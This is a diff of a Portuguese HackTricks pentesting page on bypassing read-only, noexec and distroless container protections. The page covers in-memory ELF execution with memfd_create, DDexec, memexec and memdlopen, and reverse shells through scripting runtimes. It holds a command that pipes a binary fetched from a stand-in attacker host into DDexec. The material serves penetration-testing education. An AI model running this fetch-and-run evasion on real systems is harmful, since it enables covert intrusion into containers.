@@ -1,17 +1,15 @@
 # Bypass de proteções do FS: read-only / no-exec / Distroless
 
-{{#include ../../../../banners/hacktricks-training.md}}
-
 ## Vídeos
 
-Nos vídeos a seguir, você encontrará as técnicas mencionadas nesta página explicadas com mais detalhes:<sup>[[1]](#references)[[2]](#references)</sup>
+Nos vídeos a seguir, você encontra as técnicas mencionadas nesta página explicadas com mais detalhes:<sup>[[1]](#references)[[2]](#references)</sup>
 
-- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
-- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>
+- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
+- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>
 
-## Cenário read-only / no-exec
+## cenário read-only / no-exec
 
-É cada vez mais comum encontrar máquinas Linux montadas com **proteção de sistema de arquivos somente leitura (ro)**, especialmente em containers. Isso acontece porque executar um container com sistema de arquivos ro é tão simples quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:
+Em um container, você pode montar o filesystem raiz como somente leitura definindo **`readOnlyRootFilesystem: true`** no contexto de segurança.<sup>[[3]](#references)</sup> Por exemplo:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -26,45 +24,45 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-No entanto, mesmo que o sistema de arquivos esteja montado como ro, **`/dev/shm`** continuará gravável; portanto, é falso que não possamos escrever nada no disco. Porém, essa pasta será **montada com proteção no-exec**, então, se você baixar um binário para ela, **não poderá executá-lo**.
+Uma raiz somente leitura não torna os volumes montados separadamente somente leitura. O Docker trata **`/dev/shm`** como uma montagem IPC, enquanto opções de tmpfs como `rw` e `noexec` são escolhas de configuração em runtime; inspecione as opções de montagem do container-alvo antes de depender de qualquer um desses comportamentos.<sup>[[4]](#references)[[5]](#references)</sup>
 
 > [!WARNING]
-> De uma perspectiva de red team, isso torna **complicado baixar e executar** binários que não estejam no sistema (como backdoors ou enumeradores, por exemplo, `kubectl`).
+> De uma perspectiva de red-team, essa combinação pode dificultar o download e a execução de binaries que ainda não estejam disponíveis (por exemplo, backdoors ou ferramentas de enumeração).<sup>[[4]](#references)[[5]](#references)</sup>
 
 ## Bypass mais fácil: Scripts
 
-Observe que mencionei binários: você pode **executar qualquer script** desde que o interpretador esteja presente na máquina, como um **shell script** se `sh` estiver presente ou um **script** **Python** se `python` estiver instalado.
+Uma montagem `noexec` bloqueia a execução direta de binaries nessa montagem, mas um interpretador ainda pode ler e interpretar um script. Portanto, se `sh` ou `python` estiver presente, você poderá executar um script shell ou Python por meio desse interpretador.<sup>[[5]](#references)</sup>
 
-No entanto, isso não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar executar.
+Isso não ajuda quando a ferramenta necessária é ela própria um binary.<sup>[[5]](#references)</sup>
 
 ## Bypasses de memória
 
-Se você quiser executar um binário, mas o sistema de arquivos não permitir isso, a melhor maneira de fazê-lo é **executá-lo a partir da memória**, pois as **proteções não se aplicam nesse local**.
+Quando a execução direta a partir de um caminho montado é bloqueada, uma opção é carregar o ELF na memória e executá-lo por meio de um caminho em memória. Isso evita a verificação `noexec` nessa montagem, mas não remove outros controles do kernel, de permissões ou de políticas.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### Bypass de FD + syscall exec
 
-Se você tiver alguns mecanismos de script poderosos dentro da máquina, como **Python**, **Perl** ou **Ruby**, poderá baixar o binário a ser executado para a memória, armazená-lo em um descritor de arquivo de memória (syscall `create_memfd`), que não será protegido por essas proteções, e então chamar uma **syscall `exec`**, indicando o **fd como o arquivo a ser executado**.
+Se um runtime de scripting puder acessar a interface Linux relevante, ele poderá criar um file descriptor anônimo apoiado por RAM com **`memfd_create(2)`**, escrever os bytes do ELF nele e usar um caminho de execução baseado em fd. O projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gera código Python, Perl ou Ruby compactado e codificado em base64 para esse fluxo de trabalho.<sup>[[6]](#references)[[7]](#references)</sup>
 
-Para isso, você pode usar facilmente o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode fornecer um binário a ele, e o projeto gerará um script na linguagem indicada com o **binário compactado e codificado em b64**, juntamente com as instruções para **decodificá-lo e descompactá-lo** em um **fd** criado por meio da chamada à syscall `create_memfd`, além de uma chamada à syscall **`exec`** para executá-lo.
+Atualmente, o projeto documenta alvos Python, Perl e Ruby; PHP ou Node precisam de uma técnica ou extensão diferente, específica do runtime, portanto a ausência desse gerador para uma linguagem não significa que a execução em memória seja impossível.<sup>[[6]](#references)[[12]](#references)</sup>
 
 > [!WARNING]
-> Isso não funciona em outras linguagens de script, como PHP ou Node, porque elas não têm uma **forma padrão de chamar syscalls brutas** a partir de um script; portanto, não é possível chamar `create_memfd` para criar o **fd de memória** que armazenará o binário.
+> Um executável comum gravado em **`/dev/shm`** continua sujeito à configuração **`noexec`** dessa montagem; simplesmente abri-lo por meio de um file descriptor comum não altera a política da montagem.<sup>[[5]](#references)</sup>
 >
-> Além disso, criar um **fd regular** com um arquivo em `/dev/shm` não funcionará, pois você não poderá executá-lo, já que a **proteção no-exec** será aplicada.
+> O método exato de execução em memória também depende do runtime, da arquitetura, do kernel e das permissões disponíveis.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite **modificar a memória do seu próprio processo** sobrescrevendo seu **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) escreve um stager e um loader no processo shell em execução por meio de **`/proc/self/mem`** e, então, transfere o controle para esse código.<sup>[[8]](#references)</sup>
 
-Assim, **controlando o código assembly** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.
+Isso permite que o processo carregue um binary fornecido sem primeiro colocar esse binary em um filesystem executável.<sup>[[8]](#references)</sup>
 
 > [!TIP]
-> **DDexec / EverythingExec** permitirá carregar e **executar** seu próprio **shellcode** ou **qualquer binário** a partir da **memória**.
+> **DDexec / EverythingExec** pode carregar e **executar** shellcode ou um binary a partir da **memória**.<sup>[[8]](#references)</sup>
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-Para obter mais informações sobre essa técnica, consulte o Github ou:
+Para obter mais informações sobre esta técnica, consulte o Github ou:
 
 {{#ref}}
 ddexec.md
@@ -72,13 +70,13 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. Trata-se de um **shellcode do DDexec transformado em daemon**, portanto, sempre que você quiser **executar um binary diferente**, não será necessário relançar o DDexec; basta executar o shellcode do memexec por meio da técnica DDexec e então **se comunicar com esse daemon para enviar novos binaries para carregar e executar**.
+[**Memexec**](https://github.com/arget13/memexec) é uma implementação daemonizada do DDexec. Seu daemon escuta solicitações contendo argumentos e bytes brutos do programa, cria um processo filho para carregar e executar cada programa e mantém o processo pai como servidor.<sup>[[9]](#references)</sup>
 
-Você pode encontrar um exemplo de como usar o **memexec para executar binaries a partir de um PHP reverse shell** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+O repositório inclui um exemplo de uso do **memexec para executar binários a partir de um reverse shell em PHP** em [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>
 
 ### Memdlopen
 
-Com um objetivo semelhante ao do DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binaries** na memória para executá-los posteriormente. Ela pode permitir até mesmo o carregamento de binaries com dependências.
+Com um propósito semelhante ao DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) é uma implementação fileless de `dlopen()` para um objeto compartilhado ou programa. Seu README documenta atualmente suporte a ARM64, portanto, verifique a arquitetura alvo antes de usá-lo.<sup>[[10]](#references)</sup>
 
 ## Distroless Bypass
 
@@ -90,32 +88,41 @@ Para uma explicação dedicada sobre **o que distroless realmente é**, quando e
 
 ### O que é distroless
 
-Containers distroless contêm apenas os **componentes mínimos necessários para executar uma aplicação ou serviço específico**, como bibliotecas e dependências de runtime, mas excluem componentes maiores, como um gerenciador de pacotes, shell ou utilitários do sistema.
+Imagens distroless contêm apenas a aplicação e suas dependências de runtime; as imagens oficiais não incluem gerenciadores de pacotes, shells e outros programas esperados em uma distribuição Linux padrão.<sup>[[11]](#references)</sup>
 
-O objetivo dos containers distroless é **reduzir a attack surface dos containers eliminando componentes desnecessários** e minimizando o número de vulnerabilidades que podem ser exploradas.
+Manter a imagem de runtime limitada a essas dependências reduz o software presente em produção e a quantidade que precisa ser escaneada e rastreada.<sup>[[11]](#references)</sup>
 
 ### Reverse Shell
 
-Em um container distroless, talvez você **nem encontre `sh` ou `bash`** para obter um shell comum. Você também não encontrará binaries como `ls`, `whoami`, `id`... tudo o que normalmente é executado em um sistema.
+Em um container distroless, talvez você **não encontre `sh` ou `bash`** para obter um shell regular, nem utilitários comuns como `ls`, `whoami` ou `id`.<sup>[[11]](#references)</sup>
 
 > [!WARNING]
-> Portanto, você **não conseguirá obter um **reverse shell** ou **enumerar** o sistema como normalmente faria.
+> Portanto, um reverse shell usual baseado em shell ou uma enumeração baseada em utilitários pode não funcionar.<sup>[[11]](#references)</sup>
 
-No entanto, se o container comprometido estiver executando, por exemplo, uma aplicação web Flask, o Python estará instalado e, portanto, você poderá obter um **Python reverse shell**. Se estiver executando Node, poderá obter um Node rev shell, e o mesmo se aplica à maioria das **linguagens de scripting**.
-
-> [!TIP]
-> Usando a linguagem de scripting, você poderá **enumerar o sistema** utilizando os recursos da própria linguagem.
-
-Se não houver proteções de **`read-only/no-exec`**, você poderá abusar do seu reverse shell para **gravar os seus binaries no sistema de arquivos** e **executá-los**.
+Se a aplicação comprometida incluir um runtime de linguagem (por exemplo, Python para uma aplicação Flask ou Node.js para uma aplicação Node), uma RCE ainda poderá usar esse runtime para obter um canal de comandos e realizar a inspeção do sistema por meio de suas APIs.<sup>[[11]](#references)[[12]](#references)</sup>
 
 > [!TIP]
-> No entanto, nesse tipo de container, essas proteções normalmente existirão, mas você poderá usar as **técnicas anteriores de execução em memória para contorná-las**.
+> Use a linguagem de scripting disponível para **enumerar o sistema** por meio dos recursos dessa linguagem.<sup>[[12]](#references)</sup>
 
-Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades de RCE** para obter **reverse shells** de linguagens de scripting e executar binaries a partir da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Se não houver proteções de **read-only/no-exec**, um canal de comandos poderá gravar binários em um mount gravável e executável e executá-los; verifique primeiro as opções do mount e as permissões.<sup>[[4]](#references)[[5]](#references)</sup>
 
-## Referências
+> [!TIP]
+> Quando essas proteções estiverem presentes, use as **técnicas de execução em memória acima**, quando o runtime, o kernel e as permissões permitirem.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>
 
-- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
-- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
+Você pode encontrar **exemplos** de exploração de vulnerabilidades de RCE para obter **reverse shells** em linguagens de scripting e executar binários a partir da memória em [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>
 
+## References
+
+- [1] [DEF CON 31 - Explorando a manipulação da memória do Linux para furtividade e evasão](https://www.youtube.com/watch?v=poHirez8jk4)
+- [2] [Intrusões furtivas com DDexec-ng e dlopen() em memória - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
+- [3] [Configurar um contexto de segurança para um Pod ou container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
+- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
+- [5] [mount(8) - página do manual do Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
+- [7] [memfd_create(2) - página do manual do Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
+- [8] [DDexec](https://github.com/arget13/DDexec)
+- [9] [memexec](https://github.com/arget13/memexec)
+- [10] [memdlopen](https://github.com/arget13/memdlopen)
+- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
+- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
 {{#include ../../../../banners/hacktricks-training.md}}
